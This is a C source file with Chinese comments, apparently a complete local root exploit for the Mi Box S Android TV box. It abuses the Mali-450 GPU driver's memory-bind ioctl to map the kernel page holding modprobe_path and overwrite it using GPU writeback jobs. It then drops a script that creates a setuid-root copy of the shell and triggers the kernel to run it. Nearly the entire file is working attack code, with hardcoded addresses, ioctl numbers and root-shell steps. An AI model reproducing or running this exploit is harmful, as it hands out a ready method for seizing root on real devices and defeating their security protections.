/*
 * kort_root.c - Mi Box S (oneday / MIBOX4, Android 12, kernel 4.9.269 arm64)
 *               Mali Utgard r10p1 (Mali-450) 物理内存写入提权
 *
 * 漏洞: CVE-2024-31317 - BIND_MEM 可绑定任意物理页到 GPU VA
 * 提权链:
 *   1. ALLOC_MEM 0x40000000 (16KB job 数据区) + mmap
 *   2. BIND_MEM  modprobe_path 物理页 0x027df000 -> GPU VA 0x40300000
 *   3. PP job (WB writeback) 写 "/data/local/tmp/x" 到 modprobe_path
 *   4. execve 未知格式文件 -> request_module -> 以 root 执行 x 脚本
 *
 * 阶段 0: 变体矩阵诊断 PP job UNKNOWN_ERR (bit23) 问题
 *   V1: 原版 kort 配置 (无 CREATE_CONTEXT, flags=0)
 *   V2: V1 + 提交前排空通知队列
 *   V3: V1 + cacheflush(2) 系统调用强制刷 cache
 *   V4: V1 + num_cores=0 (驱动默认)
 * 任一变体 SUCCESS 且写入落地 -> 自动进入提权写入阶段
 *
 * ioctl (mali.ko r10p1 逆向确认):
 *   MEM_ALLOC             0xC0288300
 *   MEM_FREE              0xC0108301
 *   MEM_BIND              0xC0288302
 *   PP_START_JOB          0xC1988400
 *   WAIT_FOR_NOTIFICATION 0xC0688202
 *
 * 编译: armv7a-linux-androideabi24-clang kort_root.c -o kort_root -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/syscall.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_FREE   0xC0108301
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

#define PAGE_SIZE 4096

/* ---------- 结构体 (32 位用户态, 与 mali.ko 匹配) ---------- */
typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;      /* 输入 */
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle; /* 输出 */
    int32_t  secure_shared_fd;
} alloc_mem_s;               /* 40 */

typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t free_pages_nr;
} free_mem_s;                /* 16 */

typedef struct {
    uint64_t ctx;            /* 0 */
    uint32_t vaddr;          /* 8  GPU VA */
    uint32_t size;           /* 12 */
    uint32_t flags;          /* 16 */
    union {                  /* 20 */
        uint32_t phys_addr;
        uint32_t rights;
        uint32_t mem_flags;
    };
    uint32_t pad;            /* 24 */
    int32_t  fd;             /* 28 */
} bind_mem_s;                /* 32? -> 已验证 40 字节带尾部 pad, 用 40 保险 */

typedef struct { uint32_t bind_size; uint8_t raw[44]; } bind_mem_raw_s;

#define MALI_UK_TIMELINE_MAX 3
#define _MALI_PP_MAX_SUB_JOBS 8
#define _MALI_PP_MAX_FRAME_REGISTERS 23
#define _MALI_PP_MAX_WB_REGISTERS 12
#define _MALI_DLBU_MAX_REGISTERS 4

typedef struct {
    uint32_t points[MALI_UK_TIMELINE_MAX];
    int32_t  sync_fd;
} mali_uk_fence_t;

typedef struct {
    uint64_t ctx;
    uint64_t user_job_ptr;
    uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12];
    uint32_t wb1_registers[12];
    uint32_t wb2_registers[12];
    uint32_t dlbu_registers[4];
    uint32_t num_cores;
    uint32_t perf_counter_flag;
    uint32_t perf_counter_src0;
    uint32_t perf_counter_src1;
    uint32_t frame_builder_id;
    uint32_t flush_id;
    uint32_t flags;
    uint32_t tilesx;
    uint32_t tilesy;
    uint32_t heatmap_mem;
    uint32_t num_memory_cookies;
    uint64_t memory_cookies;
    mali_uk_fence_t fence;
    uint64_t timeline_point_ptr;
} pp_start_job_s;            /* 408 */

typedef struct {
    uint64_t ctx;
    uint32_t type;           /* 输出 */
    uint32_t _pad;
    uint8_t  data[88];
} wait_for_notification_s;   /* 104 */

/* ---------- PP 硬件寄存器索引 ---------- */
#define FR_PLBU_ARRAY_ADDR   0
#define FR_RENDER_ADDR       1
#define FR_FLAGS             3
#define FR_CLEAR_DEPTH       4
#define FR_CLEAR_STENCIL     5
#define FR_CLEAR_COLOR_0     6
#define FR_CLEAR_COLOR_1     7
#define FR_CLEAR_COLOR_2     8
#define FR_CLEAR_COLOR_3     9
#define FR_WIDTH            10
#define FR_HEIGHT           11
#define FR_FRAG_STACK_ADDR  12
#define FR_FRAG_STACK_SIZE  13
#define FR_DUBYA            18
#define FR_BLOCKING         20
#define FR_SCALE            21
#define FR_FOUREIGHT        22

#define WB_TYPE           0
#define WB_ADDRESS        1
#define WB_PIXEL_FORMAT   2
#define WB_DOWNSAMPLE     3
#define WB_PIXEL_LAYOUT   4
#define WB_PITCH          5
#define WB_MRT_BITS       6

#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)
#define _MALI_NOTIFICATION_CORE_SETTINGS_CHANGED ((0 << 16) | 0x3)

#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY 0x800

/* ---------- 目标 ---------- */
#define MODPROBE_PATH_PHYS 0x027DF000UL   /* modprobe_path VA 0xffffff800a7df960 所在页 */
#define MODPROBE_PATH_OFF  0x960
#define GPU_VA_DATA        0x40000000u    /* job 数据区 (ALLOC) */
#define GPU_VA_TARGET      0x40300000u    /* modprobe_path 页 (BIND) */
#define BUF_SIZE           0x4000

/* /sbin/modprobe -> /data/local/tmp/x  (15 字节 + NUL = 5 dword) */
static const uint32_t new_path_dwords[5] = {
    0x7461642f,  /* "/dat" */
    0x6f6c2f61,  /* "a/lo" */
    0x2f6c6163,  /* "cal/" */
    0x2f706d74,  /* "tmp/" */
    0x00000078,  /* "x\0\0\0" */
};

#define __ARM_NR_cacheflush 0x0f0002
static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static const char *status_str(uint32_t s) {
    if (s & (1<<16)) return "SUCCESS";
    if (s & (1<<17)) return "OUT_OF_MEMORY";
    if (s & (1<<18)) return "ABORT";
    if (s & (1<<19)) return "TIMEOUT_SW";
    if (s & (1<<20)) return "HANG";
    if (s & (1<<21)) return "SEG_FAULT";
    if (s & (1<<22)) return "ILLEGAL_JOB";
    if (s & (1<<23)) return "UNKNOWN_ERR";
    if (s & (1<<24)) return "SHUTDOWN";
    if (s) return "???";
    return "ZERO";
}

/* 排空通知队列 (非阻塞探测: WAIT 带 alarm(0)->立即用小超时) */
static void drain_notifications(int fd) {
    wait_for_notification_s notif;
    int n = 0;
    while (n < 8) {
        memset(&notif, 0, sizeof(notif));
        int r = tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 1);
        if (r == -999 || r != 0) break;   /* EINTR/错误 -> 队列空 */
        printf("    [drain] type=0x%08x\n", notif.type);
        if (notif.type == 0) break;
        n++;
    }
}

/* 构造并提交一个 WB 写 job: 把 value 写到 gpu_target (一次写约 64B 同值窗口) */
static int submit_wb_job(int fd, uint32_t *buf, uint32_t gpu_data_va,
                         uint32_t gpu_target, uint32_t value,
                         int variant)
{
    const uint32_t OFF_PLB = 0x000, OFF_SHADER = 0x080, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;

    memset(buf, 0, 0x4000);

    uint32_t gpu_plb       = gpu_data_va + OFF_PLB;
    uint32_t gpu_shader    = gpu_data_va + OFF_SHADER;
    uint32_t gpu_rsw       = gpu_data_va + OFF_RSW;
    uint32_t gpu_tileblock = gpu_data_va + OFF_TILEBLK;
    uint32_t gpu_stack     = gpu_data_va + OFF_STACK;

    /* shader */
    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));

    /* RSW */
    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = gpu_shader | 5;
    rsw[0x0D] = 0x00000100;

    /* PLB: 1 tile + terminator */
    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | ((gpu_tileblock >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000;
    plb[4] = 0x00000000;
    plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABEDEADBEEFULL;
    job.priority = 0;
    job.num_cores = (variant == 4) ? 0 : 1;   /* V4: 0 让驱动默认 */

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = gpu_plb;
    job.frame_registers[FR_RENDER_ADDR]     = gpu_rsw;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_STENCIL]   = 0;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x100;
    job.frame_registers[FR_HEIGHT]          = 0x100;
    job.frame_registers[FR_FRAG_STACK_ADDR] = gpu_stack;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_BLOCKING]        = 0;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;

    job.wb0_registers[WB_TYPE]         = 0x02;      /* color source */
    job.wb0_registers[WB_ADDRESS]      = gpu_target;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;      /* RGBA8888 */
    job.wb0_registers[WB_DOWNSAMPLE]   = 0;
    job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
    job.wb0_registers[WB_PITCH]        = (16 * 4) / 8;
    job.wb0_registers[WB_MRT_BITS]     = 4;

    job.flags = 0;                                 /* 全部变体: flags=0! */
    job.fence.sync_fd = -1;

    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    /* cache flush: V3 用 cacheflush syscall, 其余用 __clear_cache */
    if (variant == 3)
        syscall(__ARM_NR_cacheflush, buf, (char*)buf + 0x4000, 0);
    else
        __builtin___clear_cache((char*)buf, (char*)buf + 0x4000);

    int r = tio(fd, MALI_IOC_PP_START_JOB, &job, 5);
    if (r == -999) { printf("  [-] START_JOB TIMEOUT (driver hung)\n"); return -999; }
    if (r != 0) { printf("  [-] START_JOB err=%d (%s)\n", -r, strerror(-r)); return r; }

    /* 等待: 循环直到 PP_FINISHED 或超时 */
    wait_for_notification_s notif;
    for (int i = 0; i < 4; i++) {
        memset(&notif, 0, sizeof(notif));
        r = tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
        if (r == -999) { printf("  [-] WAIT TIMEOUT\n"); return -999; }
        if (r != 0) { printf("  [-] WAIT err=%d\n", -r); return r; }
        if (notif.type == _MALI_NOTIFICATION_PP_FINISHED) {
            uint64_t ujp;
            uint32_t status;
            memcpy(&ujp, notif.data, 8);
            memcpy(&status, notif.data + 8, 4);
            printf("  [*] PP_FINISHED user_job_ptr=0x%llx status=0x%08x (%s)\n",
                   (unsigned long long)ujp, status, status_str(status));
            if (ujp != 0xCAFEBABEDEADBEEFULL)
                printf("  [!] user_job_ptr mismatch - status 解析可能错位\n");
            return (status & (1<<16)) ? 0 : -1;
        }
        printf("  [*] notif.type=0x%08x (非 PP_FINISHED, 继续)\n", notif.type);
    }
    return -2;
}

/* BIND 物理页到 GPU VA (40 字节结构, r10p1 布局) */
static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va;
    uint32_t sz = size;
    uint32_t fl = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    uint32_t pa = phys;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 20, &pa, 4);
    int r = tio(fd, MALI_IOC_MEM_BIND, raw, 3);
    if (r == -999) { printf("[-] BIND TIMEOUT\n"); return -999; }
    if (r != 0) printf("[-] BIND err=%d (%s)\n", -r, strerror(-r));
    return r;
}

/* 写 helper 脚本 /data/local/tmp/x (modprobe 执行目标) */
static int write_helper_script(void) {
    const char *path = "/data/local/tmp/x";
    FILE *f = fopen(path, "w");
    if (!f) { printf("[-] fopen %s: %s\n", path, strerror(errno)); return -1; }
    fprintf(f, "#!/system/bin/sh\n");
    fprintf(f, "cp /system/bin/sh /data/local/tmp/su\n");
    fprintf(f, "chown 0:0 /data/local/tmp/su\n");
    fprintf(f, "chmod 6755 /data/local/tmp/su\n");
    fprintf(f, "id > /data/local/tmp/pwned 2>&1\n");
    fprintf(f, "echo PWNED-OK >> /data/local/tmp/pwned\n");
    fclose(f);
    chmod(path, 0755);
    printf("[+] helper 脚本已写入 %s\n", path);
    return 0;
}

/* 触发 modprobe: execve 未知 magic 文件 -> request_module("binfmt-xxxx") */
static void trigger_modprobe(void) {
    const char *t = "/data/local/tmp/t";
    FILE *f = fopen(t, "w");
    if (f) { fputs("\xff\xff\xff\xff\xff\xff\xff\xff", f); fclose(f); chmod(t, 0755); }
    pid_t p = fork();
    if (p == 0) {
        execl(t, t, (char*)NULL);
        _exit(0);
    }
    if (p > 0) waitpid(p, NULL, 0);
}

int main(int argc, char **argv) {
    signal(SIGALRM, alh);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_root - Mi Box S Mali-450 (r10p1) PP write -> modprobe_path\n");
    printf("[*] sizeof(pp_start_job_s)=%d\n", (int)sizeof(pp_start_job_s));

    int only_stage = 0;   /* 0=全部, 1=仅诊断, 2=仅写入 */
    if (argc > 1) only_stage = atoi(argv[1]);

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d\n", fd);

    /* ALLOC job 数据区 */
    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE;
    alloc.psize = BUF_SIZE;
    int r = tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3);
    if (r == -999) { printf("[-] ALLOC TIMEOUT\n"); close(fd); return 1; }
    if (r != 0) { printf("[-] ALLOC err=%d (%s)\n", -r, strerror(-r)); close(fd); return 1; }
    printf("[+] ALLOC OK gpu_vaddr=0x%08x backend=0x%llx\n",
           alloc.gpu_vaddr, (unsigned long long)alloc.backend_handle);

    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap: %s\n", strerror(errno)); close(fd); return 1; }
    printf("[+] mmap OK at %p\n", buf);

    /* BIND modprobe_path 物理页 (先验证绑定可用) */
    r = bind_phys(fd, MODPROBE_PATH_PHYS, GPU_VA_TARGET, PAGE_SIZE);
    if (r == 0) printf("[+] BIND 0x%08x -> GPU VA 0x%08x OK\n",
                       MODPROBE_PATH_PHYS, GPU_VA_TARGET);
    else if (only_stage != 1) {
        printf("[-] BIND 失败, 无法写入\n");
    }

    int working_variant = 0;

    /* ---------- 阶段 1: 诊断矩阵 ---------- */
    if (only_stage == 0 || only_stage == 1) {
        const uint32_t verify_gpu = GPU_VA_DATA + 0x3000;
        volatile uint32_t *verify = (volatile uint32_t *)((uint8_t*)buf + 0x3000);

        for (int v = 1; v <= 4; v++) {
            printf("\n[=== 变体 V%d ===]\n", v);
            if (v == 2) { printf("  (先排空通知队列)\n"); drain_notifications(fd); }
            if (v == 3) printf("  (cacheflush syscall)\n");
            if (v == 4) printf("  (num_cores=0)\n");

            *verify = 0;
            uint32_t magic = 0xA1B2C3D0 + v;
            r = submit_wb_job(fd, (uint32_t*)buf, GPU_VA_DATA, verify_gpu, magic, v);
            if (r == -999) { printf("[-] 挂起! 停止\n"); break; }
            if (r == 0) {
                printf("  [*] verify mem: 0x%08x (expect 0x%08x)\n", *verify, magic);
                if (*verify == magic) {
                    printf("  [+] V%d 写入落地! 使用该变体\n", v);
                    working_variant = v;
                    break;
                }
                printf("  [-] job SUCCESS 但写入未落地\n");
            }
        }
    }

    /* ---------- 阶段 2: 覆写 modprobe_path ---------- */
    if (only_stage == 2) working_variant = 1;  /* 直接假定 V1 */

    if (working_variant == 0) {
        printf("\n[-] 没有可用变体, 诊断阶段结束. 尝试: ./kort_root 1\n");
        munmap(buf, BUF_SIZE); close(fd);
        return 1;
    }

    printf("\n[*** 阶段 2: 覆写 modprobe_path (变体 V%d) ***]\n", working_variant);
    if (write_helper_script() != 0) { munmap(buf, BUF_SIZE); close(fd); return 1; }

    /* 5 个 dword, 从前往后 (后面覆盖前面窗口尾部, [0,20) 最终正确) */
    for (int i = 0; i < 5; i++) {
        uint32_t target = GPU_VA_TARGET + MODPROBE_PATH_OFF + i * 4;
        printf("[*] job %d/5: 写 0x%08x -> 0x%08x\n",
               i + 1, new_path_dwords[i], target);
        r = submit_wb_job(fd, (uint32_t*)buf, GPU_VA_DATA, target,
                          new_path_dwords[i], working_variant);
        if (r == -999) { printf("[-] 挂起! 中止\n"); break; }
        if (r != 0) { printf("[-] job %d 失败, 继续\n", i + 1); }
    }

    /* ---------- 阶段 3: 触发 ---------- */
    printf("\n[*** 阶段 3: 触发 modprobe ***]\n");
    printf("[*] 当前 modprobe_path: ");
    FILE *f = fopen("/proc/sys/kernel/modprobe", "r");
    if (f) { char tmp[128]; if (fgets(tmp, sizeof(tmp), f)) printf("%s", tmp); fclose(f); }
    else printf("(不可读)\n");

    trigger_modprobe();
    sleep(2);

    struct stat st;
    if (stat("/data/local/tmp/su", &st) == 0) {
        printf("\n[+] =============================\n");
        printf("[+] ROOTED! /data/local/tmp/su\n");
        printf("[+] =============================\n");
    } else {
        printf("[-] su 未生成. 检查 /data/local/tmp/pwned 与 dmesg\n");
    }
    if (stat("/data/local/tmp/pwned", &st) == 0) {
        printf("[*] pwned 文件存在: \n");
        char line[256];
        f = fopen("/data/local/tmp/pwned", "r");
        if (f) { while (fgets(line, sizeof(line), f)) printf("    %s", line); fclose(f); }
    }

    munmap(buf, BUF_SIZE);
    close(fd);
    printf("\n[*] done\n");
    return 0;
}
